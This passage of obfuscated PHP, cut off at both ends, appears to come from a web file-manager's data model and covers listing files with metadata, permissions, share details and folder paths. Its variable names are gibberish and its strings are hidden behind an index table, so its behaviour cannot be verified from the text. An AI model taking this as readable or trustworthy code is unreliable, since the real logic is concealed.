Model($µ¿¤á[558])->field($µ¿¤á[559])->where($ş¶Ëì¼á)->select(); if (!$½«Š¾ÍÓ) { return; } $¶åó çò = array($µ¿¤á[560], $µ¿¤á[561], $µ¿¤á[540]); $·©óÊù† = array(); foreach ($½«Š¾ÍÓ as $íÈ²‰Ğ´) { if (!isset($·©óÊù†[$íÈ²‰Ğ´[$µ¿¤á[201]]])) { $·©óÊù†[$íÈ²‰Ğ´[$µ¿¤á[201]]] = array(); } if (in_array($íÈ²‰Ğ´[$µ¿¤á[105]], $¶åó çò)) { continue; } if ($íÈ²‰Ğ´[$µ¿¤á[105]] == $µ¿¤á[562]) { $íÈ²‰Ğ´[$µ¿¤á[460]] = $µ¿¤á[563]; } $·©óÊù†[$íÈ²‰Ğ´[$µ¿¤á[201]]][$íÈ²‰Ğ´[$µ¿¤á[105]]] = $íÈ²‰Ğ´[$µ¿¤á[460]]; } foreach ($Ó¸ÑÒ–ß as &$‹Ä“×ù) { $‹Ä“×ù[$µ¿¤á[564]] = !1; if (isset($·©óÊù†[$‹Ä“×ù[$µ¿¤á[201]]])) { $‹Ä“×ù[$µ¿¤á[564]] = $·©óÊù†[$‹Ä“×ù[$µ¿¤á[201]]]; } if ($this->fileIsLock($‹Ä“×ù) && $‹Ä“×ù[$µ¿¤á[511]]) { $‚¹àÙü´ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $‹Ä“×ù[$µ¿¤á[511]][$µ¿¤á[512]] = AuthModel::authDisable($‹Ä“×ù[$µ¿¤á[511]][$µ¿¤á[512]], $‚¹àÙü´); $‹Ä“×ù[$µ¿¤á[511]][$µ¿¤á[565]][$µ¿¤á[511]] = $‹Ä“×ù[$µ¿¤á[511]][$µ¿¤á[512]]; } } unset($‹Ä“×ù); } protected function _listAppendFileMeta(&$–¨µ«ú×, $­éâ¢¶ ) { $Ê­§ß­ =& $_SERVER[øşô´çË]; $İ¼€š¿² = array_to_keyvalue($–¨µ«ú×, $Ê­§ß­[12], $Ê­§ß­[566]); $İ¼€š¿² = array_filter(array_unique($İ¼€š¿²)); $İ¼€š¿² = array_to_int($İ¼€š¿²); if (!$İ¼€š¿²) { return; } $´¢Ã¸ÍÖ = array($Ê­§ß­[567] => array($Ê­§ß­[516], $İ¼€š¿²)); $øˆÀ‰é = $Ê­§ß­[568]; $Ì´‘Ÿ½¨ = Model($Ê­§ß­[569])->field($øˆÀ‰é)->where($´¢Ã¸ÍÖ)->select(); $Ì´‘Ÿ½¨ = array_to_keyvalue($Ì´‘Ÿ½¨, $Ê­§ß­[566]); $äê“Ò = Model($Ê­§ß­[570])->field($Ê­§ß­[571])->where($´¢Ã¸ÍÖ)->select(); $äê“Ò = $äê“Ò ? $äê“Ò : array(); $šñÉ™ÛŸ = array(); foreach ($äê“Ò as $ĞŠ –éÇ) { if (!isset($šñÉ™ÛŸ[$ĞŠ –éÇ[$Ê­§ß­[566]]])) { $šñÉ™ÛŸ[$ĞŠ –éÇ[$Ê­§ß­[566]]] = array(); } $šñÉ™ÛŸ[$ĞŠ –éÇ[$Ê­§ß­[566]]][$ĞŠ –éÇ[$Ê­§ß­[105]]] = $ĞŠ –éÇ[$Ê­§ß­[460]]; } foreach ($–¨µ«ú× as &$¬½ÊõÓ¼) { $èĞî‰ª = $¬½ÊõÓ¼[$Ê­§ß­[566]]; if (!$èĞî‰ª || !is_array($Ì´‘Ÿ½¨[$èĞî‰ª])) { continue; } $ü…Õ‘õ = $Ì´‘Ÿ½¨[$èĞî‰ª]; $ü…Õ‘õ[$Ê­§ß­[89]] = $¬½ÊõÓ¼[$Ê­§ß­[89]]; $ü…Õ‘õ[$Ê­§ß­[42]] = $¬½ÊõÓ¼[$Ê­§ß­[42]]; if (!$ü…Õ‘õ[$Ê­§ß­[572]]) { Model($Ê­§ß­[569])->fileMd5Check($ü…Õ‘õ); } if (!isset(self::$cacheFileInfo[$Ê­§ß­[573] . $èĞî‰ª])) { self::$cacheFileInfo[$Ê­§ß­[573] . $èĞî‰ª] = array_merge(array(), $ü…Õ‘õ); } unset($Ì´‘Ÿ½¨[$èĞî‰ª][$Ê­§ß­[97]]); $€±„şà— = isset($šñÉ™ÛŸ[$èĞî‰ª]) && is_array($šñÉ™ÛŸ[$èĞî‰ª]) ? $šñÉ™ÛŸ[$èĞî‰ª] : array(); $¬½ÊõÓ¼[$Ê­§ß­[177]] = array_merge($€±„şà—, $Ì´‘Ÿ½¨[$èĞî‰ª]); if (isset($¬½ÊõÓ¼[$Ê­§ß­[177]][$Ê­§ß­[192]])) { $¬½ÊõÓ¼[$Ê­§ß­[192]] = json_decode($¬½ÊõÓ¼[$Ê­§ß­[177]][$Ê­§ß­[192]], !0); unset($¬½ÊõÓ¼[$Ê­§ß­[177]][$Ê­§ß­[192]]); } } unset($¬½ÊõÓ¼); } protected function _listAppendSourceInfo(&$Ü´´óœ, $¼®úïşµ) { $êÕÉ–¹Ş =& $_SERVER[øşô´çË]; $é…åë‰£ = Model($êÕÉ–¹Ş[574])->listData(); $Åúßµß = Model($êÕÉ–¹Ş[523])->listData(); $ışü’’Ü = Model($êÕÉ–¹Ş[513])->listData(); $Î‘Î«¿’ = Model($êÕÉ–¹Ş[575])->listSimple(); $…±“¿»Ì = array_to_keyvalue($é…åë‰£, $êÕÉ–¹Ş[496]); $úº’‘âà = array_to_keyvalue_group($Åúßµß, $êÕÉ–¹Ş[97], $êÕÉ–¹Ş[524]); $Í•†ĞÏ = array_to_keyvalue($ışü’’Ü, $êÕÉ–¹Ş[97]); $µÁÜŸÊ¢ = array_to_keyvalue_group($Î‘Î«¿’, $êÕÉ–¹Ş[201]); foreach ($Ü´´óœ as &$á¾Üàº») { $á¾Üàº»[$êÕÉ–¹Ş[100]] = array($êÕÉ–¹Ş[576] => 0, $êÕÉ–¹Ş[577] => 0, $êÕÉ–¹Ş[578] => 0); if (isset($Í•†ĞÏ[$á¾Üàº»[$êÕÉ–¹Ş[201]]])) { $á¾Üàº»[$êÕÉ–¹Ş[100]][$êÕÉ–¹Ş[579]] = 1; $á¾Üàº»[$êÕÉ–¹Ş[100]][$êÕÉ–¹Ş[580]] = $Í•†ĞÏ[$á¾Üàº»[$êÕÉ–¹Ş[201]]][$êÕÉ–¹Ş[42]]; } if ($úº’‘âà && $…±“¿»Ì && isset($úº’‘âà[$á¾Üàº»[$êÕÉ–¹Ş[201]]])) { $á¾Üàº»[$êÕÉ–¹Ş[100]][$êÕÉ–¹Ş[581]] = array(); foreach ($úº’‘âà[$á¾Üàº»[$êÕÉ–¹Ş[201]]] as $›êİ€â) { $Ê¦½ÁÁ³ = $…±“¿»Ì[$›êİ€â]; $á¾Üàº»[$êÕÉ–¹Ş[100]][$êÕÉ–¹Ş[581]][] = array($êÕÉ–¹Ş[582] => $Ê¦½ÁÁ³[$êÕÉ–¹Ş[496]], $êÕÉ–¹Ş[518] => $Ê¦½ÁÁ³[$êÕÉ–¹Ş[42]], $êÕÉ–¹Ş[583] => $Ê¦½ÁÁ³[$êÕÉ–¹Ş[584]]); } } if ($µÁÜŸÊ¢ && isset($µÁÜŸÊ¢[$á¾Üàº»[$êÕÉ–¹Ş[201]]])) { $á¾Üàº»[$êÕÉ–¹Ş[100]][$êÕÉ–¹Ş[585]] = array(); foreach ($µÁÜŸÊ¢[$á¾Üàº»[$êÕÉ–¹Ş[201]]] as $İ™˜”Ô) { $á¾Üàº»[$êÕÉ–¹Ş[100]][$êÕÉ–¹Ş[585]] = $this->shareFilterShow($İ™˜”Ô); } } } unset($á¾Üàº»); return $Ü´´óœ; } protected function shareFilterShow($¾¬Ö§˜) { $³´à·¸ =& $_SERVER[øşô´çË]; if (!$¾¬Ö§˜) { return $¾¬Ö§˜; } $í‹øÈºœ = $³´à·¸[586]; if ($¾¬Ö§˜[$³´à·¸[587]] == $³´à·¸[101]) { $í‹øÈºœ .= $³´à·¸[588]; } if (is_array($¾¬Ö§˜[$³´à·¸[589]]) && is_array($¾¬Ö§˜[$³´à·¸[589]][$³´à·¸[590]])) { $¾¬Ö§˜[$³´à·¸[589]][$³´à·¸[590]] = $³´à·¸[591]; } if (!$ƒÉ‘×¢â[$³´à·¸[592]] && $ƒÉ‘×¢â[$³´à·¸[201]] != $³´à·¸[238]) { $ƒÉ‘×¢â[$³´à·¸[592]] = KodIO::make($ƒÉ‘×¢â[$³´à·¸[201]]); } $¾¬Ö§˜ = array_field_key($¾¬Ö§˜, explode($³´à·¸[60], $í‹øÈºœ)); return $¾¬Ö§˜; } protected function _listAppendChildren(&$œ·ˆòì×, $’¥‘ş™Ü) { $ì¿­Õ ® =& $_SERVER[øşô´çË]; $»­ã½©× = array(); $ñ¾Û®õø = array($ì¿­Õ ®[249] => 0, $ì¿­Õ ®[250] => 0); foreach ($œ·ˆòì× as &$Æãü¾©¼) { if (!$Æãü¾©¼[$ì¿­Õ ®[509]]) { continue; } $»­ã½©×[] = intval($Æãü¾©¼[$ì¿­Õ ®[201]]); } unset($Æãü¾©¼); if (!$»­ã½©×) { return; } $Õ„Ô Åå = array($ì¿­Õ ®[200] => array($ì¿­Õ ®[7], $»­ã½©×), $ì¿­Õ ®[529] => 0); $ù–†½ìĞ = array($ì¿­Õ ®[200], $ì¿­Õ ®[509], $ì¿­Õ ®[593] => $ì¿­Õ ®[594]); $î“Ş„ïŸ = $this->field($ù–†½ìĞ)->where($Õ„Ô Åå)->group($ì¿­Õ ®[595])->select(); $Ğ£­±ï = array(); foreach ($î“Ş„ïŸ as $ä²¢´¥Ë) { $÷î÷æˆú = $ä²¢´¥Ë[$ì¿­Õ ®[200]]; $ÕÄäÁ€ = $ä²¢´¥Ë[$ì¿­Õ ®[509]] == $ì¿­Õ ®[101] ? $ì¿­Õ ®[250] : $ì¿­Õ ®[249]; if (!isset($Ğ£­±ï[$÷î÷æˆú])) { $Ğ£­±ï[$÷î÷æˆú] = array($ì¿­Õ ®[249] => 0, $ì¿­Õ ®[250] => 0); } $Ğ£­±ï[$÷î÷æˆú][$ÕÄäÁ€] += $ä²¢´¥Ë[$ì¿­Õ ®[594]]; } foreach ($œ·ˆòì× as &$Æãü¾©¼) { if (!$Æãü¾©¼[$ì¿­Õ ®[509]]) { continue; } $Ş˜ñ¡ƒ¯ = is_array($Ğ£­±ï[$Æãü¾©¼[$ì¿­Õ ®[201]]]) ? $Ğ£­±ï[$Æãü¾©¼[$ì¿­Õ ®[201]]] : $ñ¾Û®õø; $Æãü¾©¼[$ì¿­Õ ®[250]] = $Ş˜ñ¡ƒ¯[$ì¿­Õ ®[250]]; $Æãü¾©¼[$ì¿­Õ ®[249]] = $Ş˜ñ¡ƒ¯[$ì¿­Õ ®[249]]; unset($Æãü¾©¼[$ì¿­Õ ®[510]]); } unset($Æãü¾©¼); } protected function _listAppendAuth(&$è¼—ğò) { $ãĞ“äÈõ =& $_SERVER[øşô´çË]; $‹ƒøÎÏî = array(); foreach ($è¼—ğò as $”›ó¥Åå) { if ($”›ó¥Åå[$ãĞ“äÈõ[198]] == self::TYPE_GROUP) { $‹ƒøÎÏî[] = intval($”›ó¥Åå[$ãĞ“äÈõ[201]]); } } if (!$‹ƒøÎÏî) { return; } $€¿˜ïşó = array_to_keyvalue($è¼—ğò, $ãĞ“äÈõ[201]); $¥å¬ô°Ô = Model($ãĞ“äÈõ[596])->getSourceList($‹ƒøÎÏî, $€¿˜ïşó); $ì¸•Ø÷à = KodUser::isRoot(); foreach ($è¼—ğò as $˜¦¤Ó¬‘ => &$”›ó¥Åå) { $”›ó¥Åå[$ãĞ“äÈõ[511]] = $¥å¬ô°Ô[$”›ó¥Åå[$ãĞ“äÈõ[201]]]; if (!$”›ó¥Åå[$ãĞ“äÈõ[511]] && $”›ó¥Åå[$ãĞ“äÈõ[198]] == self::TYPE_GROUP) { $”›ó¥Åå[$ãĞ“äÈõ[511]] = Action($ãĞ“äÈõ[597])->pathGroupAuthMake($”›ó¥Åå[$ãĞ“äÈõ[598]]); if (!$”›ó¥Åå[$ãĞ“äÈõ[511]] && !$ì¸•Ø÷à) { $”›ó¥Åå[$ãĞ“äÈõ[243]] = !1; $”›ó¥Åå[$ãĞ“äÈõ[242]] = !1; } } if ($”›ó¥Åå[$ãĞ“äÈõ[511]]) { $”›ó¥Åå[$ãĞ“äÈõ[243]] = AuthModel::authCheckEdit($”›ó¥Åå[$ãĞ“äÈõ[511]][$ãĞ“äÈõ[512]]); $”›ó¥Åå[$ãĞ“äÈõ[242]] = AuthModel::authCheckView($”›ó¥Åå[$ãĞ“äÈõ[511]][$ãĞ“äÈõ[512]]); } $this->groupPathDisplay($”›ó¥Åå); } unset($”›ó¥Åå); } public function _listAppendAuthSecret(&$š›»­ò”) { $ªìÄÒÍü =& $_SERVER[øşô´çË]; if (Model($ªìÄÒÍü[531])->get($ªìÄÒÍü[599]) != $ªìÄÒÍü[101]) { return; } static $öÃ¬©¡¾ = false; if (!$öÃ¬©¡¾) { $¡©…ãğõ = Model($ªìÄÒÍü[600]); $Á«ÈÙä¦ = Model($ªìÄÒÍü[601]); $öÃ¬©¡¾ = $Á«ÈÙä¦->listData(); $öÃ¬©¡¾ = array_to_keyvalue($öÃ¬©¡¾, $ªìÄÒÍü[201]); $¿¾ßéÒ¡ = json_decode(Model($ªìÄÒÍü[531])->get($ªìÄÒÍü[602]), !0); $¿¾ßéÒ¡ = array_to_keyvalue($¿¾ßéÒ¡, $ªìÄÒÍü[496]); foreach ($öÃ¬©¡¾ as $ü Ä¡· => $Ù¢±öŒ) { $€úµ¥½Š = $¿¾ßéÒ¡[$Ù¢±öŒ[$ªìÄÒÍü[603]]]; if (!$€úµ¥½Š) { $Á«ÈÙä¦->remove($Ù¢±öŒ[$ªìÄÒÍü[496]]); unset($öÃ¬©¡¾[$ü Ä¡·]); continue; } $—¶±¹§Ÿ = $¡©…ãğõ->listData($€úµ¥½Š[$ªìÄÒÍü[511]]); if (!$—¶±¹§Ÿ) { $Á«ÈÙä¦->remove($Ù¢±öŒ[$ªìÄÒÍü[496]]); unset($öÃ¬©¡¾[$ü Ä¡·]); continue; } $Ù¢±öŒ[$ªìÄÒÍü[511]] = $—¶±¹§Ÿ; $Ù¢±öŒ[$ªìÄÒÍü[604]] = $€úµ¥½Š; $Ù¢±öŒ[$ªìÄÒÍü[605]] = Model($ªìÄÒÍü[606])->getInfoSimpleOuter($Ù¢±öŒ[$ªìÄÒÍü[550]]); $öÃ¬©¡¾[$ü Ä¡·] = $Ù¢±öŒ; } } $ŞÇş÷Á = USER_ID; $×ê‡ù² = array(); $Ì„“‚Çß = $this->_listAppendPath($×ê‡ù², !0); foreach ($š›»­ò” as $ü Ä¡· => &$Ù¢±öŒ) { if (!is_array($Ù¢±öŒ[$ªìÄÒÍü[511]])) { continue; } if ($Ù¢±öŒ[$ªìÄÒÍü[198]] != $ªìÄÒÍü[607]) { continue; } if (isset($öÃ¬©¡¾[$Ù¢±öŒ[$ªìÄÒÍü[201]]])) { $ä‡¨³Ìº = $öÃ¬©¡¾[$Ù¢±öŒ[$ªìÄÒÍü[201]]]; if (!is_array($Ù¢±öŒ[$ªìÄÒÍü[564]])) { $Ù¢±öŒ[$ªìÄÒÍü[564]] = array(); } $Ù¢±öŒ[$ªìÄÒÍü[564]][$ªìÄÒÍü[608]] = $ä‡¨³Ìº[$ªìÄÒÍü[603]]; $Ù¢±öŒ[$ªìÄÒÍü[511]][$ªìÄÒÍü[609]] = $ä‡¨³Ìº; $Ù¢±öŒ[$ªìÄÒÍü[511]][$ªìÄÒÍü[610]] = $Ù¢±öŒ[$ªìÄÒÍü[611]]; $Ù¢±öŒ[$ªìÄÒÍü[511]][$ªìÄÒÍü[612]] = $ªìÄÒÍü[101]; if ($ä‡¨³Ìº[$ªìÄÒÍü[550]] != $ŞÇş÷Á) { $Ù¢±öŒ[$ªìÄÒÍü[511]][$ªìÄÒÍü[512]] = $Ù¢±öŒ[$ªìÄÒÍü[511]][$ªìÄÒÍü[512]] & $ä‡¨³Ìº[$ªìÄÒÍü[511]][$ªìÄÒÍü[511]]; } continue; } $†è×şñ = $this->parentLevelArray($Ù¢±öŒ[$ªìÄÒÍü[613]]); $–ìêøÑ‡ = array_reverse($†è×şñ); foreach ($–ìêøÑ‡ as $úõ¸²Ì¸ => $Ã­ìù³Š) { if (!isset($öÃ¬©¡¾[$Ã­ìù³Š])) { continue; } $ä‡¨³Ìº = $öÃ¬©¡¾[$Ã­ìù³Š]; $Ù¢±öŒ[$ªìÄÒÍü[511]][$ªìÄÒÍü[609]] = $ä‡¨³Ìº; if ($ä‡¨³Ìº[$ªìÄÒÍü[550]] != $ŞÇş÷Á) { $Ù¢±öŒ[$ªìÄÒÍü[511]][$ªìÄÒÍü[512]] = $Ù¢±öŒ[$ªìÄÒÍü[511]][$ªìÄÒÍü[512]] & $ä‡¨³Ìº[$ªìÄÒÍü[511]][$ªìÄÒÍü[511]]; } $ùû¿àÃ½ = $ªìÄÒÍü[12]; $·è¬ÕÃ‚ = count($†è×şñ) - $úõ¸²Ì¸; for ($ìáÏÑÍ² = 0; $ìáÏÑÍ² < $·è¬ÕÃ‚; $ìáÏÑÍ²++) { if (!isset($Ì„“‚Çß[$†è×şñ[$ìáÏÑÍ²]])) { $ùû¿àÃ½ = $ªìÄÒÍü[12]; break; } $ùû¿àÃ½ = $ùû¿àÃ½ . rtrim($Ì„“‚Çß[$†è×şñ[$ìáÏÑÍ²]], $ªìÄÒÍü[8]) . $ªìÄÒÍü[8]; } $Ù¢±öŒ[$ªìÄÒÍü[511]][$ªìÄÒÍü[610]] = rtrim($ùû¿àÃ½, $ªìÄÒÍü[8]) . $ªìÄÒÍü[8]; break; } } unset($Ù¢±öŒ); } public function groupPathDisplay(&$¾æ»ÁÂ¼) { $ƒÔ¿©Ò =& $_SERVER[øşô´çË]; if ($¾æ»ÁÂ¼[$ƒÔ¿©Ò[198]] != self::TYPE_GROUP) { return; } $×ÓíúÏ› = Model($ƒÔ¿©Ò[614])->getInfo($¾æ»ÁÂ¼[$ƒÔ¿©Ò[598]]); $÷°Î‚Ùá = $this->parentLevelArray($×ÓíúÏ›[$ƒÔ¿©Ò[613]]); $©ÇÊÑ–î = $ƒÔ¿©Ò[12]; foreach ($÷°Î‚Ùá as $Ñş‰‡ÜÕ) { $à‡ç™Ù© = Model($ƒÔ¿©Ò[614])->getInfo($Ñş‰‡ÜÕ); $©ÇÊÑ–î .= $à‡ç™Ù©[$ƒÔ¿©Ò[100]][$ƒÔ¿©Ò[201]] . $ƒÔ¿©Ò[60]; } $¾æ»ÁÂ¼[$ƒÔ¿©Ò[615]] = $×ÓíúÏ›[$ƒÔ¿©Ò[200]]; $¾æ»ÁÂ¼[$ƒÔ¿©Ò[616]] = $×ÓíúÏ›[$ƒÔ¿©Ò[613]]; $¾æ»ÁÂ¼[$ƒÔ¿©Ò[617]] = $×ÓíúÏ›[$ƒÔ¿©Ò[618]]; $¾æ»ÁÂ¼[$ƒÔ¿©Ò[619]] = $©ÇÊÑ–î . $×ÓíúÏ›[$ƒÔ¿©Ò[100]][$ƒÔ¿©Ò[201]]; } protected function _listAppendPath(&$‡©ÔçÉì, $¼ÙÕÃ©ø = false) { $ıçòÂ“• =& $_SERVER[øşô´çË]; static $Îí´ÔÆ = array(); $†®ĞôÁÀ = array(); $ññ©Ç¼š = array(); if ($¼ÙÕÃ©ø) { return $Îí´ÔÆ; } foreach ($‡©ÔçÉì as &$õ–¡§ÎØ) { $è¥¨šÎ = $õ–¡§ÎØ[$ıçòÂ“•[201]]; if ($õ–¡§ÎØ[$ıçòÂ“•[509]] == $ıçòÂ“•[101] && $õ–¡§ÎØ[$ıçòÂ“•[200]] != 0) { $Îí´ÔÆ[$è¥¨šÎ] = $õ–¡§ÎØ[$ıçòÂ“•[42]]; } if ($õ–¡§ÎØ[$ıçòÂ“•[509]] == $ıçòÂ“•[101] && $õ–¡§ÎØ[$ıçòÂ“•[200]] == 0) { $Îí´ÔÆ[$è¥¨šÎ] = $this->_listAppendPathRoot($õ–¡§ÎØ, array()); } if (isset($ññ©Ç¼š[$õ–¡§ÎØ[$ıçòÂ“•[613]]])) { continue; } $ññ©Ç¼š[$õ–¡§ÎØ[$ıçòÂ“•[613]]] = !0; $ÆÊÚÏ² = $this->parentLevelArray($õ–¡§ÎØ[$ıçòÂ“•[613]]); foreach ($ÆÊÚÏ² as $¿×öæğÌ => $ÙÓ¸Íëø) { if (isset($Îí´ÔÆ[$ÙÓ¸Íëø])) { continue; } if ($¿×öæğÌ == 0) { $Îí´ÔÆ[$ÙÓ¸Íëø] = $this->_listAppendPathRoot($õ–¡§ÎØ, $ÆÊÚÏ²); } if ($¿×öæğÌ != 0) { $†®ĞôÁÀ[] = $ÙÓ¸Íëø; } } } unset($õ–¡§ÎØ); $†®ĞôÁÀ = array_unique($†®ĞôÁÀ); if (count($†®ĞôÁÀ) > 0) { $»ƒàá¢À = array($ıçòÂ“•[515] => array($ıçòÂ“•[516], $†®ĞôÁÀ)); if (count($†®ĞôÁÀ) == 1) { $Ø’³Å´  = $this->sourceInfo($†®ĞôÁÀ[0]); $­ê·ä­¢ = is_array($Ø’³Å´ ) ? array($Ø’³Å´ ) : !1; } else { $­ê·ä­¢ = $this->field($ıçòÂ“•[620])->where($»ƒàá¢À)->select(); } if (!$­ê·ä­¢) { $­ê·ä­¢ = array(); } foreach ($­ê·ä­¢ as $Úş¸äÄü) { $Îí´ÔÆ[$Úş¸äÄü[$ıçòÂ“•[201]]] = $Úş¸äÄü[$ıçòÂ“•[42]]; } } $€Ç€®…¹ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $™µ„¦ı÷ = array(); foreach ($‡©ÔçÉì as &$õ–¡§ÎØ) { $ºØÚîïæ = $õ–¡§ÎØ[$ıçòÂ“•[613]]; $›¯éãáÑ = $ıçòÂ“•[12]; if (isset($™µ„¦ı÷[$ºØÚîïæ])) { $›¯éãáÑ = $™µ„¦ı÷[$ºØÚîïæ]; } else { $ÆÊÚÏ² = $this->parentLevelArray($õ–¡§ÎØ[$ıçòÂ“•[613]]); foreach ($ÆÊÚÏ² as $¿×öæğÌ => $ÙÓ¸Íëø) { if (isset($Îí´ÔÆ[$ÙÓ¸Íëø])) { $›¯éãáÑ .= $Îí´ÔÆ[$ÙÓ¸Íëø] . $ıçòÂ“•[8]; } } $™µ„¦ı÷[$ºØÚîïæ] = $›¯éãáÑ; } $›¯éãáÑ .= $õ–¡§ÎØ[$ıçòÂ“•[42]]; if ($õ–¡§ÎØ[$ıçòÂ“•[509]] == $ıçòÂ“•[101]) { $›¯éãáÑ .= $ıçòÂ“•[8]; } $õ–¡§ÎØ[$ıçòÂ“•[611]] = str_replace($ıçòÂ“•[264], $ıçòÂ“•[8], $›¯éãáÑ); if ($õ–¡§ÎØ[$ıçòÂ“•[200]] == $ıçòÂ“•[238]) { $õ–¡§ÎØ[$ıçòÂ“•[42]] = trim($Îí´ÔÆ[$õ–¡§ÎØ[$ıçòÂ“•[201]]], $ıçòÂ“•[8]); $õ–¡§ÎØ[$ıçòÂ“•[611]] = $õ–¡§ÎØ[$ıçòÂ“•[42]] . $ıçòÂ“•[8]; } if (intval($õ–¡§ÎØ[$ıçòÂ“•[198]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($õ–¡§ÎØ, $ÆÊÚÏ², $€Ç€®…¹); } } unset($õ–¡§ÎØ); return $‡©ÔçÉì; } private function _listAppendPathRecycle(&$ò‹Ï£ğÎ, $ÀØá¯¨, $¡Œİ¿œâ) { $×¼Ší‹‘ =& $_SERVER[øşô´çË]; if (!in_array($¡Œİ¿œâ, $ÀØá¯¨) && $ò‹Ï£ğÎ[$×¼Ší‹‘[201]] != $¡Œİ¿œâ) { return; } $ó­Ì­³¼ = explode($×¼Ší‹‘[8], trim($ò‹Ï£ğÎ[$×¼Ší‹‘[611]], $×¼Ší‹‘[8])); $×¡à÷ = implode($×¼Ší‹‘[8], array_slice($ó­Ì­³¼, 2)); $ò‹Ï£ğÎ[$×¼Ší‹‘[611]] = $×¼Ší‹‘[8] . LNG($×¼Ší‹‘[621]) . $×¼Ší‹‘[8] . ltrim($×¡à÷, $×¼Ší‹‘[8]); $ò‹Ï£ğÎ[$×¼Ší‹‘[613]] = $×¼Ší‹‘[622] . implode($×¼Ší‹‘[60], array_slice($ÀØá¯¨, 1)) . $×¼Ší‹‘[60]; if ($ò‹Ï£ğÎ[$×¼Ší‹‘[201]] == $¡Œİ¿œâ) { $ò‹Ï£ğÎ[$×¼Ší‹‘[613]] = $×¼Ší‹‘[622]; $ò‹Ï£ğÎ[$×¼Ší‹‘[200]] = $×¼Ší‹‘[238]; $ò‹Ï£ğÎ[$×¼Ší‹‘[42]] = LNG($×¼Ší‹‘[621]); } $ò‹Ï£ğÎ[$×¼Ší‹‘[623]] = $×¼Ší‹‘[624]; } protected function _listAppendPathRoot(&$¸Ú˜äÛ„, $”Û€º€Ñ) { $¸å”ä§ =& $_SERVER[øşô´çË]; static $é„ìåáÚ = false; static $•º¿î©ˆ = false; $«’Óïã  = $¸å”ä§[12]; if ($¸Ú˜äÛ„[$¸å”ä§[198]] == self::TYPE_USER) { if ($¸Ú˜äÛ„[$¸å”ä§[598]] == USER_ID) { $«’Óïã  = LNG($¸å”ä§[625]); if ($é„ìåáÚ === !1) { $ğ™”¼£ö = Model($¸å”ä§[626])->getInfoFull(USER_ID); $é„ìåáÚ = _get($ğ™”¼£ö, $¸å”ä§[627], $¸å”ä§[12]); } if ($•º¿î©ˆ === !1) { $ğ™”¼£ö = Model($¸å”ä§[626])->getInfoFull(USER_ID); $•º¿î©ˆ = _get($ğ™”¼£ö, $¸å”ä§[628], $¸å”ä§[12]); } if ($”Û€º€Ñ && $”Û€º€Ñ[0] == $é„ìåáÚ || !$”Û€º€Ñ && $¸Ú˜äÛ„[$¸å”ä§[201]] == $é„ìåáÚ) { $«’Óïã  = LNG($¸å”ä§[629]); $¸Ú˜äÛ„[$¸å”ä§[630]] = $¸å”ä§[631]; } if ($”Û€º€Ñ && $”Û€º€Ñ[0] == $•º¿î©ˆ || !$”Û€º€Ñ && $¸Ú˜äÛ„[$¸å”ä§[201]] == $•º¿î©ˆ) { $«’Óïã  = $«’Óïã  . $¸å”ä§[632] . LNG($¸å”ä§[633]); } if (!$”Û€º€Ñ) { $¸Ú˜äÛ„[$¸å”ä§[42]] = $«’Óïã ; } } else { $ğ™”¼£ö = Model($¸å”ä§[626])->getInfoFull($¸Ú˜äÛ„[$¸å”ä§[598]]); $Äšˆòö¹ = _get($ğ™”¼£ö, $¸å”ä§[628], $¸å”ä§[12]); $¸Ú˜äÛ„[$¸å”ä§[634]] = Model($¸å”ä§[606])->getInfoSimpleOuter($¸Ú˜äÛ„[$¸å”ä§[598]]); $«’Óïã  = LNG($¸å”ä§[635]) . $¸å”ä§[183] . $¸Ú˜äÛ„[$¸å”ä§[634]][$¸å”ä§[42]] . $¸å”ä§[185]; if ($”Û€º€Ñ && $”Û€º€Ñ[0] == $Äšˆòö¹ || !$”Û€º€Ñ && $¸Ú˜äÛ„[$¸å”ä§[201]] == $Äšˆòö¹) { $«’Óïã  = LNG($¸å”ä§[635]) . $¸å”ä§[636] . $¸Ú˜äÛ„[$¸å”ä§[634]][$¸å”ä§[42]] . $¸å”ä§[632] . LNG($¸å”ä§[633]) . $¸å”ä§[185]; } } } else { if ($¸Ú˜äÛ„[$¸å”ä§[198]] == self::TYPE_GROUP) { $¯²Å› Û = Model($¸å”ä§[614])->getInfoSimple($¸Ú˜äÛ„[$¸å”ä§[598]]); $«’Óïã  = $¯²Å› Û[$¸å”ä§[42]]; } else { if ($¸Ú˜äÛ„[$¸å”ä§[198]] == self::TYPE_SYSTEM) { $«’Óïã  = $¸å”ä§[637]; } } } $«’Óïã  = $«’Óïã  ? $¸å”ä§[8] . $«’Óïã  . $¸å”ä§[8] : $¸å”ä§[8]; return $«’Óïã ; } protected function _listAppendUser(&$×˜ó˜ƒÜ) { $—ºÔ×ÉÚ =& $_SERVER[øşô´çË]; $­íØŒñ˜ = array_to_keyvalue($×˜ó˜ƒÜ, $—ºÔ×ÉÚ[12], $—ºÔ×ÉÚ[550]); $ªóà…ğä = array_to_keyvalue($×˜ó˜ƒÜ, $—ºÔ×ÉÚ[12], $—ºÔ×ÉÚ[552]); $§ñÎß¢ = array_merge($­íØŒñ˜, $ªóà…ğä); $ùò¤Ø‡ = Model($—ºÔ×ÉÚ[626])->userListInfo($§ñÎß¢); foreach ($×˜ó˜ƒÜ as &$¸„ç¤«„) { $ºİ¸è±œ = $¸„ç¤«„[$—ºÔ×ÉÚ[550]]; $¸„ç¤«„[$—ºÔ×ÉÚ[550]] = $ùò¤Ø‡[$ºİ¸è±œ] ? $ùò¤Ø‡[$ºİ¸è±œ] : !1; $ºİ¸è±œ = $¸„ç¤«„[$—ºÔ×ÉÚ[552]]; $¸„ç¤«„[$—ºÔ×ÉÚ[552]] = $ùò¤Ø‡[$ºİ¸è±œ] ? $ùò¤Ø‡[$ºİ¸è±œ] : !1; if (_get($¸„ç¤«„, $—ºÔ×ÉÚ[638], 0)) { $š…§Ø³ğ = $GLOBALS[$—ºÔ×ÉÚ[6]][$—ºÔ×ÉÚ[102]][$—ºÔ×ÉÚ[639]]; if ($¸„ç¤«„[$—ºÔ×ÉÚ[564]][$—ºÔ×ÉÚ[640]] <= time() - $š…§Ø³ğ) { $this->metaSet($¸„ç¤«„[$—ºÔ×ÉÚ[201]], $—ºÔ×ÉÚ[641], null); $this->metaSet($¸„ç¤«„[$—ºÔ×ÉÚ[201]], $—ºÔ×ÉÚ[640], null); unset($¸„ç¤«„[$—ºÔ×ÉÚ[564]][$—ºÔ×ÉÚ[641]]); continue; } $Â¦”˜à = 